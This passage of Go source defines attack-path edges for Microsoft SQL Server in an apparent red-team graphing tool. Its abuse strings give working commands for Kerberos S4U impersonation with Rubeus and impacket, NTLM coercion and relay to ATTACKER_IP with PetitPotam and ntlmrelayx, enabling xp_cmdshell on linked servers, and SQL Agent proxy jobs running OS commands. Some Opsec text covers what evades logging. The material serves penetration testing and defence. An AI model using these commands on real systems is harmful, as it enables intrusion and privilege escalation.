			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for failed login attempts and can be viewed by executing EXEC sp_readerrorlog 0, 1, 'Login';), but successful login events are not logged by default. ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.ConnectAnyDatabase: func(ctx *EdgeContext) EdgeProperties {
		var general, windowsAbuse, linuxAbuse string
		if ctx.TargetTypeDescription == "SERVER" {
			general = "The CONNECT ANY DATABASE permission allows the source " + ctx.SourceType + " to connect to any database under the " + ctx.SQLServerName + " SQL Server without a mapped database user."
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to any database by executing USE <database_name>; GO; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to any database by executing USE <database_name>; GO; "
		} else if ctx.TargetTypeDescription == "DATABASE" {
			general = "The CONNECT ANY DATABASE permission allows the source " + ctx.SourceType + " to connect to the " + ctx.TargetName + " database without a mapped database user."
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to the " + ctx.TargetName + " database by executing USE " + ctx.TargetName + "; GO; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to the " + ctx.TargetName + " database by executing USE " + ctx.TargetName + "; GO; "
		}
		return EdgeProperties{
			Traversable:  false,
			General:      general,
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for failed login attempts and can be viewed by executing EXEC sp_readerrorlog 0, 1, 'Login';), but successful login events are not logged by default. ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.AlterAnyAppRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The ALTER ANY APPLICATION ROLE permission on a database allows the source " + ctx.SourceType + " to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions.",
			WindowsAbuse: "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			LinuxAbuse:   "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			Opsec:        "This attack should not be performed as it will cause an immediate outage for the application using this role.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17",
		}
	},

	EdgeKinds.AlterAnyDBRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The ALTER ANY ROLE permission on a database allows the source " + ctx.SourceType + " to add members to any user-defined database role. Note that only members of the db_owner fixed database role can add members to fixed database roles.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + ";\n" +
				"EXEC sp_addrolemember 'role_name', 'user_name';",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + ";\n" +
				"EXEC sp_addrolemember 'role_name', 'user_name';",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to database role membership. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.HasDBScopedCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The database contains a database-scoped credential that authenticates as the target domain account when accessing external resources, although there is no guarantee the credentials are currently valid. Unlike server-level credentials, these are contained within the database and portable with database backups.",
			WindowsAbuse: "The credential could be crackable if it has a weak password and is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials required further research.",
			LinuxAbuse:   "The credential is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials required further research.",
			Opsec:        "Database-scoped credential usage is logged when accessing external resources. These credentials are included in database backups, making them portable. The credential secret is encrypted and cannot be retrieved directly.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-database-scoped-credential-transact-sql?view=sql-server-ver17 \n" +
				"- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
		}
	},

	EdgeKinds.HasMappedCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "This SQL login has a mapped credential that allows it to authenticate as the target domain account when accessing external resources outside of SQL Server, including over the network and at the host OS level. However, there is no guarantee the credentials are currently valid. SQL Server Agent must be running (could potentially be started via xp_cmdshell if service account has permission) and the login must have permission to add a credential proxy, grant the proxy access to a subsystem such as CmdExec or PowerShell, and add/start a job using the proxy to traverse this edge.",
			WindowsAbuse: "The credential could be crackable if it has a weak password and is used automatically when the login accesses certain external resources",
			LinuxAbuse: " -- SQL Server Agent must be running/started (or access box via xp_cmdshell first, then start, which requires admin)\n" +
				"\n" +
				"-- Server will validate creds before executing the job\n" +
				"CREATE CREDENTIAL MyCredential1\n" +
				"WITH IDENTITY = 'MAYYHEM\\lowpriv',\n" +
				"SECRET = 'password';\n" +
				"\n" +
				"EXEC msdb.dbo.sp_add_proxy \n" +
				"    @proxy_name = 'ETL_Proxy',\n" +
				"    @credential_name = 'MyCredential1',\n" +
				"    @enabled = 1;\n" +
				"\n" +
				"-- 3. Grant proxy access to subsystems (CmdExec for OS commands)\n" +
				"EXEC msdb.dbo.sp_grant_proxy_to_subsystem \n" +
				"    @proxy_name = 'ETL_Proxy',\n" +
				"    @subsystem_name = 'CmdExec';\n" +
				"\n" +
				"-- 4. CREATE THE JOB FIRST\n" +
				"EXEC msdb.dbo.sp_add_job \n" +
				"    @job_name = N'MyJob',\n" +
				"    @enabled = 1,\n" +
				"    @description = N'Test job using proxy';\n" +
				"\n" +
				"-- 5. Now add the job step that uses the proxy\n" +
				"EXEC msdb.dbo.sp_add_jobstep\n" +
				"    @job_name = N'MyJob',\n" +
				"    @step_name = N'Run Command as Proxy User',\n" +
				"    @step_id = 1,\n" +
				"    @subsystem = N'CmdExec',\n" +
				"    @command = N'cmd /c \"\\\\10.4.10.254\\\\c\"',\n" +
				"    @proxy_name = N'ETL_Proxy';\n" +
				"\n" +
				"-- Re-run\n" +
				"EXEC msdb.dbo.sp_start_job @job_name = N'MyJob';\n" +
				"\n" +
				"-- 6. Add job to local server\n" +
				"EXEC msdb.dbo.sp_add_jobserver \n" +
				"    @job_name = N'MyJob',\n" +
				"    @server_name = N'(local)';\n" +
				"\n" +
				"-- 7. Execute the job immediately to test\n" +
				"EXEC msdb.dbo.sp_start_job @job_name = N'MyJob'; ",
			Opsec: "Credential usage is logged when accessing external resources. The actual credential password is encrypted and cannot be retrieved. Credential mapping changes are not logged in the default trace.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-credential-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/credentials-database-engine?view=sql-server-ver17 \n" +
				"- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
		}
	},

	EdgeKinds.HasProxyCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The SQL principal is authorized to use SQL Agent proxy '" + ctx.ProxyName + "' that runs job steps as " + ctx.CredentialIdentity + ". This proxy can be used with subsystems: " + ctx.Subsystems + ". There is no guarantee the credentials are currently valid.",
			WindowsAbuse: "Create and execute a SQL Agent job using the proxy:\n" +
				"-- Create job \n" +
				"EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_" + ctx.ProxyName + "'; \n" +
				"-- Add job step using proxy \n" +
				"EXEC msdb.dbo.sp_add_jobstep \n" +
				"   @job_name = 'ProxyTest_" + ctx.ProxyName + "', \n" +
				"   @step_name = 'RunAsProxy', \n" +
				"   @subsystem = 'CmdExec', \n" +
				"   @command = 'whoami > C:\\temp\\proxy_user.txt', \n" +
				"   @proxy_name = '" + ctx.ProxyName + "'; \n" +
				"-- Execute job \n" +
				"EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_" + ctx.ProxyName + "'; \n" +
				"-- Check job status \n" +
				"EXEC msdb.dbo.sp_help_jobactivity @job_name = 'ProxyTest_" + ctx.ProxyName + "'; ",
			LinuxAbuse: "Create and execute a SQL Agent job using the proxy:\n" +
				"-- Create job \n" +
				"EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_" + ctx.ProxyName + "'; \n" +
				"-- Add job step using proxy \n" +
				"EXEC msdb.dbo.sp_add_jobstep \n" +
				"   @job_name = 'ProxyTest_" + ctx.ProxyName + "', \n" +
				"   @step_name = 'RunAsProxy', \n" +
				"   @subsystem = 'CmdExec', \n" +
				"   @command = 'whoami > /tmp/proxy_user.txt', \n" +
				"   @proxy_name = '" + ctx.ProxyName + "'; \n" +
				"-- Execute job \n" +
				"EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_" + ctx.ProxyName + "'; ",
			Opsec: "SQL Agent job execution is logged in msdb job history tables and Windows Application event log. The job runs as " + ctx.CredentialIdentity + ". Proxy is " + func() string {
				if ctx.IsEnabled {
					return "ENABLED"
				}
				return "DISABLED - must be enabled before use"
			}() + ".",
			References: "- https://learn.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/ssms/agent/use-proxies-to-run-jobs?view=sql-server-ver17 \n" +
				"- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
		}
	},

	EdgeKinds.ServiceAccountFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Base is non-traversable; MakeInterestingEdgesTraversable overrides to true
			General:      "This domain account runs the SQL Server service.",
			WindowsAbuse: "The service account context determines SQL Server's access to network resources and local system privileges.",
			LinuxAbuse:   "The service account context determines SQL Server's access to system resources and file permissions.",
			Opsec:        "Service account changes require service restart and are logged in Windows event logs.",
			References:   "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17",
		}
	},

	EdgeKinds.HasLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The domain account has a SQL Server login that is enabled and can connect to the SQL Server. This allows authentication to SQL Server using the account's credentials.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server and authenticate as " + ctx.TargetName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py)",
			LinuxAbuse:   "Connect to the " + ctx.SQLServerName + " SQL server and authenticate as " + ctx.TargetName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio)",
			Opsec:        "Windows authentication attempts are logged in SQL Server error logs for failed logins. Successful logins are not logged by default but can be enabled. Computer account authentication appears as DOMAIN\\COMPUTER$.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17",
		}
	},

	EdgeKinds.GetTGS: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The SQL Server service account can request Kerberos service tickets for domain accounts that have a login on this SQL Server.",
			WindowsAbuse: "From a domain-joined machine as the service account (or with valid credentials):\n" +
				"# List SPNs for the SQL Server to find target accounts: \n" +
				"setspn -L " + ctx.SQLServerName + " \n" +
				"# Request TGT for the service account: \n" +
				".\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap \n" +
				"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account: \n" +
				"Rubeus.exe s4u /impersonateuser:<account> /altservice:<spn> /self /nowrap /ticket:<base64> \n" +
				"# Start a sacrificial logon session for the Kerberos ticket: \n" +
				"runas /netonly /user:asdf powershell \n" +
				"# Import the ticket into the sacrificial logon session: \n" +
				"Rubeus.exe ptt /ticket:<base64> \n" +
				"# Launch SQL Server Management Studio or sqlcmd and connect to the database. ",
			LinuxAbuse: "From a Linux machine with valid credentials:\n" +
				"# Request TGT for the service account: \n" +
				"getTGT.py internal.lab/sqlsvc:P@ssw0rd  \n" +
				"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account: \n" +
				"python3 gets4uticket.py kerberos+ccache://internal.lab\\\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\\$@internal.lab sccm_s4u.ccache -v \n" +
				"# Connect to the  database: \n" +
				"KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\\$@sql.internal.lab  -k -no-pass -windows-auth ",
			Opsec:      "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts.",
			References: "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17 ",
		}
	},

	EdgeKinds.GetAdminTGS: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The SQL Server service account can request Kerberos service tickets for domain accounts that have administrative privileges on this SQL Server.",
			WindowsAbuse: "From a domain-joined machine as the service account (or with valid credentials):\n" +
				"# List SPNs for the SQL Server to find target accounts: \n" +
				"setspn -L " + ctx.SQLServerName + " \n" +
				"# Request TGT for the service account: \n" +
				".\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap \n" +
				"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA: \n" +
				"Rubeus.exe s4u /impersonateuser:<dba> /altservice:<spn> /self /nowrap /ticket:<base64> \n" +
				"# Start a sacrificial logon session for the Kerberos ticket: \n" +
				"runas /netonly /user:asdf powershell \n" +
				"# Import the ticket into the sacrificial logon session: \n" +
				"Rubeus.exe ptt /ticket:<base64> \n" +
				"# Launch SQL Server Management Studio or sqlcmd and connect to the database. ",
			LinuxAbuse: "From a Linux machine with valid credentials:\n" +
				"# Request TGT for the service account: \n" +
				"getTGT.py internal.lab/sqlsvc:P@ssw0rd  \n" +
				"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA: \n" +
				"python3 gets4uticket.py kerberos+ccache://internal.lab\\\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\\$@internal.lab sccm_s4u.ccache -v \n" +
				"# Connect to the  database: \n" +
				"KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\\$@sql.internal.lab  -k -no-pass -windows-auth ",
			Opsec:      "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts.",
			References: "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17 ",
		}
	},

	EdgeKinds.LinkedAsAdmin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The source SQL Server has a linked server connection to the target with administrative privileges (sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN). This allows full control of the remote SQL Server including privilege escalation.",
			WindowsAbuse: "Execute commands with admin privileges on the linked server:\n" +
				"-- Enable xp_cmdshell on remote server \n" +
				"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName]; \n" +
				"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName]; \n" +
				"EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LinkedServerName]; ",
			LinuxAbuse: "Execute commands with admin privileges on the linked server:\n" +
				"-- Enable xp_cmdshell on remote server \n" +
				"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName]; \n" +
				"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName]; \n" +
				"EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LinkedServerName]; ",
			Opsec: "Linked server admin actions are logged on the remote server as coming from the linked server connection. Creating logins and adding to sysadmin generates event logs. Linked server queries may be logged differently than direct connections.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17 \n" +
				"- https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
		}
	},

	EdgeKinds.CoerceAndRelayTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The computer account has a SQL Server login and the SQL Server has Extended Protection disabled. This allows coercing the computer account authentication and relaying it to SQL Server to gain access.",
			WindowsAbuse: "Coerce and relay authentication to SQL Server:\n" +
				"# 1. Set up NTLM relay targeting SQL Server \n" +
				"ntlmrelayx.py -t mssql://" + ctx.SQLServerName + " -smb2support \n" +
				"# 2. Trigger authentication from target computer using: \n" +
				"# - PrinterBug/SpoolSample \n" +
				"SpoolSample.exe TARGET_COMPUTER ATTACKER_IP \n" +
				"# - PetitPotam \n" +
				"PetitPotam.py -u '' -p '' ATTACKER_IP TARGET_COMPUTER \n" +
				"# - Coercer with various methods \n" +
				"coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP \n" +
				"# 3. Relay executes SQL commands as DOMAIN\\COMPUTER$ ",
			LinuxAbuse: "Coerce and relay authentication to SQL Server:\n" +
				"# 1. Set up NTLM relay targeting SQL Server \n" +
				"ntlmrelayx.py -t mssql://" + ctx.SQLServerName + " -smb2support \n" +
				"# 2. Trigger authentication using various methods: \n" +
				"# - PetitPotam (unauthenticated) \n" +
				"python3 PetitPotam.py ATTACKER_IP TARGET_COMPUTER \n" +
				"# - Coercer with multiple protocols \n" +
				"coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP --filter-protocol-name \n" +
				"# - PrinterBug via Wine \n" +
				"wine SpoolSample.exe TARGET_COMPUTER ATTACKER_IP \n" +
				"# 3. ntlmrelayx will authenticate to SQL and execute commands ",
			Opsec: "Coercion methods may generate logs on the target system (Event ID 4624/4625). SQL Server logs will show authentication from the computer account. NTLM authentication to SQL Server is normal behavior. Extended Protection prevents this attack when enabled.",
			References: "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17 \n" +
				"- https://github.com/topotam/PetitPotam \n" +
				"- https://github.com/p0dalirius/Coercer \n" +
				"- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",
		}
	},

	// Database-level permission edges
	EdgeKinds.AlterDB: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The ALTER permission on a database grants the source " + ctx.SourceType + " effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE. ALTER ANY ROLE permission allows the principal to add members to any user-defined database role. Note that only members of the db_owner fixed database role can add members to fixed server roles. The ALTER ANY APPLICATION ROLE permission on a database allows the source " + ctx.SourceType + " to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions. WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"Alter database role: EXEC sp_addrolemember 'rolename', 'user' \n" +
				"Alter application role: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"Alter database role: EXEC sp_addrolemember 'rolename', 'user' \n" +
				"Alter application role: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to database role membership. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.AlterDBRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The ALTER permission on a database role allows the source " + ctx.SourceType + " to add members to the database role. Only members of the db_owner fixed database role can add members to fixed database roles.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + ";\n" +
				"EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name';",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + ";\n" +
				"EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name';",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to database role membership. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.AlterServerRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The ALTER permission on a user-defined server role allows the source " + ctx.SourceType + " to add members to the server role. Principals cannot be granted ALTER permission on fixed server roles.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember 'login', '" + ctx.TargetName + "';",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember 'login', '" + ctx.TargetName + "';",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to server role membership. \n" +
				"To view server role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.ControlDBRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL permission on a database role grants the source " + ctx.SourceType + " all defined permissions on the role. This includes the ability to add members to the role and change its ownership.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; \n" +
				"Change owner: ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user_name]; ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; \n" +
				"Change owner: ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user_name]; ",
